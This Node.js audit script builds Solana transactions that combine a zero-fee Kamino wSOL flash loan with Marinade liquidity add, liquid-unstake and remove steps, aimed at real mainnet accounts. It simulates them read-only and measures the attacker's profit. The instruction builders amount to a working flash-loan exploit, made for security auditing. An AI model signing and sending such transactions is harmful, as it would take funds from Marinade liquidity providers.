// Real Solana-v1 read-only mainnet simulations: exact-zero-fee KLend wSOL
// flash funding composed atomically with Marinade. Never signs or sends.
const fs = require('fs');
const crypto = require('crypto');
const {Connection, PublicKey, SystemProgram, TransactionInstruction, TransactionMessage,
  SYSVAR_INSTRUCTIONS_PUBKEY} = require(
  '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/web3.js');
const {NATIVE_MINT, TOKEN_PROGRAM_ID, createAssociatedTokenAccountIdempotentInstruction,
  createCloseAccountInstruction, createSyncNativeInstruction, getAssociatedTokenAddressSync} = require(
  '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/spl-token');
const anchor = require(
  '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@coral-xyz/anchor');
const bs58Module = require(
  '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/bs58');
const bs58 = bs58Module.default || bs58Module;
const env = Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env', 'utf8')
  .split(/\r?\n/).filter(x => x.includes('=')).map(x => x.split(/=(.*)/s).slice(0, 2)));
const rpcUrl = env.HEAVY_RPC_URL || env.RPC_URL;
const conn = new Connection(rpcUrl, 'confirmed');
const P = x => new PublicKey(x);
const KLEND = P('KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD');
const KLEND_RESERVE = P('4oigbthMAgjTMPyw8dBxhxU59YMtvNDHqhpR3W4HAzBM');
const MARINADE = P('MarBmsSgKXdrN1egZf5sqe1TMai9K1rChYNDJgjq7aD');
const state = P('8szGkuLTAux9XMgZ2vtY39jVSowEcpBfFfD8hXSEqdGC');
const mint = P('mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So');
const lpMint = P('LPmSozJJ8Jh69ut2WP3XmVohTjL4ipR18yiCzxrUmVj');
const solLeg = P('UefNb6z6yvArqe4cJHTXCqStRsKmWhGxnZzuHbikP5Q');
const msolLeg = P('7GgPYjS5Dza89wV6FpZ23kUJRG5vbQ1GM25ezspYFSoE');
const treasury = P('B1aLzaNMeFVAyQ6f3XbbUyKcH2YPHu2fqiEagmiF23VR');
const user = P('6LY1JzAFVZsP2a2xKrtU6znQMQ5h4i7tocWdgrkZzkzF');
const userMsol = P('HBX3MgNtEwCxM3RXzqDxdM98m94DiHcqcYwB16HkbNhF');
const userWsol = getAssociatedTokenAddressSync(NATIVE_MINT, user);
const userLp = getAssociatedTokenAddressSync(lpMint, user);
const [lpMintAuthority] = PublicKey.findProgramAddressSync(
  [state.toBuffer(), Buffer.from('liq_mint')], MARINADE);
const [msolLegAuthority] = PublicKey.findProgramAddressSync(
  [state.toBuffer(), Buffer.from('liq_st_sol_authority')], MARINADE);
const klendIdl = JSON.parse(fs.readFileSync(
  'composer-runs/2026-10-15/marginfi-source/idls-complete/kamino_lending.json'));
const klendCoder = new anchor.BorshAccountsCoder(klendIdl);
const disc = name => crypto.createHash('sha256').update('global:' + name).digest().subarray(0, 8);
const u64 = n => {const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(n)); return b;};
const meta = (pubkey, writable = false, signer = false) => ({pubkey, isWritable: writable, isSigner: signer});
const pk = x => x instanceof PublicKey ? x : P(x);

function flashIx(kind, reserve, amount, borrowIndex) {
  const market = pk(reserve.lending_market);
  const [authority] = PublicKey.findProgramAddressSync([Buffer.from('lma'), market.toBuffer()], KLEND);
  const data = Buffer.concat([Buffer.from(kind === 'borrow'
    ? [135, 231, 52, 167, 7, 52, 212, 193]
    : [185, 117, 0, 203, 96, 245, 180, 186]), u64(amount),
    ...(kind === 'repay' ? [Buffer.from([borrowIndex])] : [])]);
  return new TransactionInstruction({programId: KLEND, data, keys: [
    meta(user, true, true), meta(authority), meta(market), meta(KLEND_RESERVE, true),
    meta(pk(reserve.liquidity.mint_pubkey)), meta(pk(reserve.liquidity.supply_vault), true),
    meta(userWsol, true), meta(pk(reserve.liquidity.fee_vault), true), meta(KLEND), meta(KLEND),
    meta(SYSVAR_INSTRUCTIONS_PUBKEY), meta(TOKEN_PROGRAM_ID),
  ]});
}
function add(amount) {
  return new TransactionInstruction({programId: MARINADE, data: Buffer.concat([disc('add_liquidity'), u64(amount)]), keys: [
    meta(state, true), meta(lpMint, true), meta(lpMintAuthority), meta(msolLeg), meta(solLeg, true),
    meta(user, true, true), meta(userLp, true), meta(SystemProgram.programId), meta(TOKEN_PROGRAM_ID),
  ]});
}
function remove(amount) {
  return new TransactionInstruction({programId: MARINADE, data: Buffer.concat([disc('remove_liquidity'), u64(amount)]), keys: [
    meta(state, true), meta(lpMint, true), meta(userLp, true), meta(user, false, true),
    meta(user, true), meta(userMsol, true), meta(solLeg, true), meta(msolLeg, true),
    meta(msolLegAuthority), meta(SystemProgram.programId), meta(TOKEN_PROGRAM_ID),
  ]});
}
function liquid(amount) {
  return new TransactionInstruction({programId: MARINADE, data: Buffer.concat([disc('liquid_unstake'), u64(amount)]), keys: [
    meta(state, true), meta(mint, true), meta(solLeg, true), meta(msolLeg, true), meta(treasury, true),
    meta(userMsol, true), meta(user, false, true), meta(user, true), meta(SystemProgram.programId), meta(TOKEN_PROGRAM_ID),
  ]});
}
const createWsol = () => createAssociatedTokenAccountIdempotentInstruction(user, userWsol, user, NATIVE_MINT);
const closeWsol = () => createCloseAccountInstruction(userWsol, user, user);
const createLp = () => createAssociatedTokenAccountIdempotentInstruction(user, userLp, user, lpMint);
const closeLp = () => createCloseAccountInstruction(userLp, user, user);
function flashWrap(reserve, amount, middle) {
  const instructions = [createWsol(), flashIx('borrow', reserve, amount), closeWsol(), ...middle,
    createWsol(), SystemProgram.transfer({fromPubkey: user, toPubkey: userWsol, lamports: amount}),
    createSyncNativeInstruction(userWsol), flashIx('repay', reserve, amount, 1), closeWsol()];
  return instructions;
}
function flashAttack(reserve, added, sold, mintedLp) {
  return flashWrap(reserve, added, [createLp(), add(added), liquid(sold), remove(mintedLp), closeLp()]);
}
function flashAttackRepeated(reserve, added, sold, mintedLp1, mintedLp2) {
  return flashWrap(reserve, added, [createLp(),
    add(added), liquid(sold), remove(mintedLp1),
    add(added), liquid(sold), remove(mintedLp2), closeLp()]);
}
function flashDirect(reserve, funding, netMsol) {
  return flashWrap(reserve, funding, [liquid(netMsol)]);
}

function encodeV1(instructions, blockhash, computeLimit = 1_400_000, dataLimit = 67_108_864) {
  const v0 = new TransactionMessage({payerKey: user, recentBlockhash: blockhash, instructions}).compileToV0Message([]);
  const keys = v0.staticAccountKeys, items = v0.compiledInstructions;
  if (keys.length > 64 || items.length > 64 || v0.addressTableLookups.length) throw new Error('v1 limits exceeded');
  const cfg = Buffer.alloc(8); cfg.writeUInt32LE(computeLimit, 0); cfg.writeUInt32LE(dataLimit, 4);
  const heads = items.map(ix => {const b = Buffer.alloc(4); b[0] = ix.programIdIndex;
    b[1] = ix.accountKeyIndexes.length; b.writeUInt16LE(ix.data.length, 2); return b;});
  const payloads = items.map(ix => Buffer.concat([Buffer.from(ix.accountKeyIndexes), Buffer.from(ix.data)]));
  const wire = Buffer.concat([Buffer.from([0x81, v0.header.numRequiredSignatures,
    v0.header.numReadonlySignedAccounts, v0.header.numReadonlyUnsignedAccounts]),
    Buffer.from([0x0c, 0, 0, 0]), Buffer.from(bs58.decode(blockhash)),
    Buffer.from([items.length, keys.length]), ...keys.map(x => x.toBuffer()), cfg, ...heads, ...payloads,
    Buffer.alloc(64 * v0.header.numRequiredSignatures)]);
  if (wire.length > 4096) throw new Error(`v1 size ${wire.length}`);
  return {wire, messageBytes: wire.length, accounts: keys.length, writable: keys.length -
    v0.header.numReadonlySignedAccounts - v0.header.numReadonlyUnsignedAccounts,
    instructions: items.length, requiredSignatures: v0.header.numRequiredSignatures,
    orderedAccounts: keys.map(x => x.toBase58()), config: {computeLimit, dataLimit}};
}
const watched = [];
function project(a, label) {
  if (!a?.data) return null;
  const data = Buffer.from(a.data[0], 'base64');
  const out = {lamports: a.lamports, owner: a.owner, hash: crypto.createHash('sha256').update(data).digest('hex')};
  if (/Msol|Wsol|Lp|Supply|Fee|Leg|Treasury/.test(label) && data.length >= 72)
    out.tokenAmount = data.readBigUInt64LE(64).toString();
  if (label === 'klendReserve') {
    const decoded = klendCoder.decode('Reserve', data);
    out.reserve = {
      lastUpdateSlot: decoded.last_update.slot.toString(),
      lastUpdateStale: decoded.last_update.stale,
      totalAvailableAmount: decoded.liquidity.total_available_amount.toString(),
      borrowedAmountSf: decoded.liquidity.borrowed_amount_sf.toString(),
      accumulatedProtocolFeesSf: decoded.liquidity.accumulated_protocol_fees_sf.toString(),
      accumulatedReferrerFeesSf: decoded.liquidity.accumulated_referrer_fees_sf.toString(),
      pendingReferrerFeesSf: decoded.liquidity.pending_referrer_fees_sf.toString(),
    };
  }
  return out;
}
async function rpc(method, params) {
  const res = await fetch(rpcUrl, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: method, method, params})});
  return res.json();
}
async function simulate(name, instructions, blockhash, trace) {
  const e = encodeV1(instructions, blockhash);
  const json = await rpc('simulateTransaction', [e.wire.toString('base64'), {encoding: 'base64', sigVerify: false,
    replaceRecentBlockhash: true, commitment: 'confirmed',
    accounts: {encoding: 'base64', addresses: trace.map(x => x.key.toBase58())}}]);
  const v = json.result?.value;
  return {name, err: v?.err || null, rpcError: json.error || null, slot: json.result?.context?.slot,
    ...e, wireSha256: crypto.createHash('sha256').update(e.wire).digest('hex'),
    units: v?.unitsConsumed, loadedAccountsDataSize: v?.loadedAccountsDataSize,
    post: Object.fromEntries(trace.map((x, i) => [x.label, project(v?.accounts?.[i], x.label)])), logs: v?.logs || []};
}
const amount = (image, label) => BigInt(image?.[label]?.tokenAmount || 0);
const lamports = (image, label) => BigInt(image?.[label]?.lamports || 0);
const facts = r => r.logs.filter(x => /Instruction:|LP for user|SOL out amount|msol_fee|treasury_msol_cut|failed|Error/.test(x));

async function main() {
  const reserveInfo = await conn.getAccountInfo(KLEND_RESERVE, 'confirmed');
  const reserve = klendCoder.decode('Reserve', reserveInfo.data);
  if (!pk(reserve.liquidity.mint_pubkey).equals(NATIVE_MINT)) throw new Error('reserve is not wSOL');
  const flashFee = BigInt(reserve.config.fees.flash_loan_fee_sf.toString());
  if (flashFee !== 0n) throw new Error(`flash fee rate is nonzero: ${flashFee}`);
  const available = BigInt(reserve.liquidity.total_available_amount.toString());
  const trace = [
    {label: 'userSol', key: user}, {label: 'userMsol', key: userMsol},
    {label: 'userWsol', key: userWsol}, {label: 'userLp', key: userLp},
    {label: 'klendReserve', key: KLEND_RESERVE}, {label: 'klendSupply', key: pk(reserve.liquidity.supply_vault)},
    {label: 'klendFee', key: pk(reserve.liquidity.fee_vault)}, {label: 'marinadeSolLeg', key: solLeg},
    {label: 'marinadeMsolLeg', key: msolLeg}, {label: 'marinadeTreasury', key: treasury},
  ];
  const preRaw = await conn.getMultipleAccountsInfoAndContext(trace.map(x => x.key), 'confirmed');
  const pre = Object.fromEntries(trace.map((x, i) => [x.label, preRaw.value[i] ? project({
    data: [preRaw.value[i].data.toString('base64')], lamports: preRaw.value[i].lamports,
    owner: preRaw.value[i].owner.toBase58()}, x.label) : null]));
  const preUserSol = lamports(pre, 'userSol'), preMsol = amount(pre, 'userMsol');
  const blockhash = (await conn.getLatestBlockhash('confirmed')).blockhash;
  const results = [];
  const controlAmounts = [1n, 1000000n, available - 1n, available, available + 1n];
  for (const n of controlAmounts) {
    const r = await simulate(`flash_unwrap_rewrap_repay_${n}`,
      flashWrap(reserve, n, []), blockhash, trace); r.input = {fundingRaw: n.toString()}; results.push(r);
  }
  for (const [added, sold] of [[1n, 1n], [1000000000000n, 1000000000000n],
    [3000000000000n, 1000000000000n], [available - 1n, 1000000000000n]]) {
    const addControl = await simulate(`add_control_${added}_${sold}`, [createLp(), add(added)], blockhash, trace);
    results.push(addControl);
    if (addControl.err || addControl.rpcError) continue;
    const mintedLp = amount(addControl.post, 'userLp') - amount(pre, 'userLp');
    if (mintedLp <= 0n) continue;
    const attack = await simulate(`flash_add_liquid_remove_repay_${added}_${sold}`,
      flashAttack(reserve, added, sold, mintedLp), blockhash, trace);
    attack.input = {fundingRaw: added.toString(), grossMsolSoldRaw: sold.toString(), mintedLp: mintedLp.toString()};
    results.push(attack);
    if (attack.err || attack.rpcError) continue;
    const netMsol = preMsol - amount(attack.post, 'userMsol');
    const attackSol = lamports(attack.post, 'userSol') - preUserSol;
    attack.balanceOutcome = {netMsolSpentRaw: netMsol.toString(), userSolDeltaAfterRepayment: attackSol.toString(),
      klendSupplyDelta: (amount(attack.post, 'klendSupply') - amount(pre, 'klendSupply')).toString(),
      klendFeeDelta: (amount(attack.post, 'klendFee') - amount(pre, 'klendFee')).toString(),
      reserveStateChanged: attack.post.klendReserve?.hash !== pre.klendReserve?.hash};
    const direct = await simulate(`flash_direct_normalized_repay_${added}_${sold}`,
      flashDirect(reserve, added, netMsol), blockhash, trace);
    results.push(direct);
    if (!direct.err && !direct.rpcError) {
      const directSol = lamports(direct.post, 'userSol') - preUserSol;
      direct.balanceOutcome = {netMsolSpentRaw: netMsol.toString(), userSolDeltaAfterRepayment: directSol.toString(),
        attackAdvantageLamportsAfterRepayment: (attackSol - directSol).toString(),
        klendSupplyDelta: (amount(direct.post, 'klendSupply') - amount(pre, 'klendSupply')).toString(),
        klendFeeDelta: (amount(direct.post, 'klendFee') - amount(pre, 'klendFee')).toString(),
        reserveStateChanged: direct.post.klendReserve?.hash !== pre.klendReserve?.hash};
    }
  }
  // Two attack legs in one real v1 transaction, reusing the same 3,000 SOL flash
  // principal. Stage the first cycle plus the second add to calculate its exact LP
  // mint amount from current state; all calls remain unsigned read-only simulations.
  {
    const added = 3000000000000n, sold = 1000000000000n;
    const first = results.find(x => x.name === `add_control_${added}_${sold}`);
    const mintedLp1 = amount(first?.post, 'userLp') - amount(pre, 'userLp');
    const stage = await simulate('repeat_stage_exact_second_lp', [createLp(),
      add(added), liquid(sold), remove(mintedLp1), add(added)], blockhash, trace);
    results.push(stage);
    if (!stage.err && !stage.rpcError) {
      const mintedLp2 = amount(stage.post, 'userLp') - amount(pre, 'userLp');
      const attack = await simulate('flash_repeat2_add_liquid_remove_repay',
        flashAttackRepeated(reserve, added, sold, mintedLp1, mintedLp2), blockhash, trace);
      attack.input = {fundingRaw: added.toString(), grossMsolSoldPerLegRaw: sold.toString(), legs: 2,
        mintedLp1: mintedLp1.toString(), mintedLp2: mintedLp2.toString()};
      results.push(attack);
      if (!attack.err && !attack.rpcError) {
        const netMsol = preMsol - amount(attack.post, 'userMsol');
        const attackSol = lamports(attack.post, 'userSol') - preUserSol;
        attack.balanceOutcome = {netMsolSpentRaw: netMsol.toString(), userSolDeltaAfterRepayment: attackSol.toString(),
          klendSupplyDelta: (amount(attack.post, 'klendSupply') - amount(pre, 'klendSupply')).toString(),
          klendFeeDelta: (amount(attack.post, 'klendFee') - amount(pre, 'klendFee')).toString(),
          reserveStateChanged: attack.post.klendReserve?.hash !== pre.klendReserve?.hash};
        const direct = await simulate('flash_repeat2_direct_normalized_repay',
          flashDirect(reserve, added, netMsol), blockhash, trace);
        results.push(direct);
        if (!direct.err && !direct.rpcError) {
          const directSol = lamports(direct.post, 'userSol') - preUserSol;
          direct.balanceOutcome = {netMsolSpentRaw: netMsol.toString(), userSolDeltaAfterRepayment: directSol.toString(),
            attackAdvantageLamportsAfterRepayment: (attackSol - directSol).toString(),
            klendSupplyDelta: (amount(direct.post, 'klendSupply') - amount(pre, 'klendSupply')).toString(),
            klendFeeDelta: (amount(direct.post, 'klendFee') - amount(pre, 'klendFee')).toString(),
            reserveStateChanged: direct.post.klendReserve?.hash !== pre.klendReserve?.hash};
        }
      }
    }
  }
  for (const r of results) r.facts = facts(r);
  const output = {timestamp: new Date().toISOString(), transport:
    'read-only current-mainnet simulateTransaction; sigVerify false; no sendTransaction',
    transactionFormat: {version: 1, maximumBytes: 4096, maximumInlineAccounts: 64},
    klend: {program: KLEND.toBase58(), reserve: KLEND_RESERVE.toBase58(), mint: NATIVE_MINT.toBase58(),
      supplyVault: pk(reserve.liquidity.supply_vault).toBase58(), feeVault: pk(reserve.liquidity.fee_vault).toBase58(),
      reserveAvailableRaw: available.toString(), flashLoanFeeSf: flashFee.toString(),
      feeClassification: 'configured-exact-zero-rate'},
    marinade: {program: MARINADE.toBase58(), state: state.toBase58(), solLeg: solLeg.toBase58(),
      msolLeg: msolLeg.toBase58(), lpMint: lpMint.toBase58()},
    actor: {owner: user.toBase58(), msol: userMsol.toBase58(), wsol: userWsol.toBase58(), lp: userLp.toBase58()},
    preSlot: preRaw.context.slot, pre, results};
  fs.writeFileSync('composer-runs/2026-10-15/marinade-gap-audit-91c47aca/marinade-klend-wsol-v1.json',
    JSON.stringify(output, null, 2));
  for (const r of results) console.log(JSON.stringify({name: r.name, err: r.err, rpcError: r.rpcError,
    bytes: r.messageBytes, accounts: r.accounts, instructions: r.instructions, units: r.units,
    input: r.input, outcome: r.balanceOutcome, facts: r.facts?.slice(-12)}));
}
main().catch(e => {console.error(e.stack); process.exitCode = 1;});
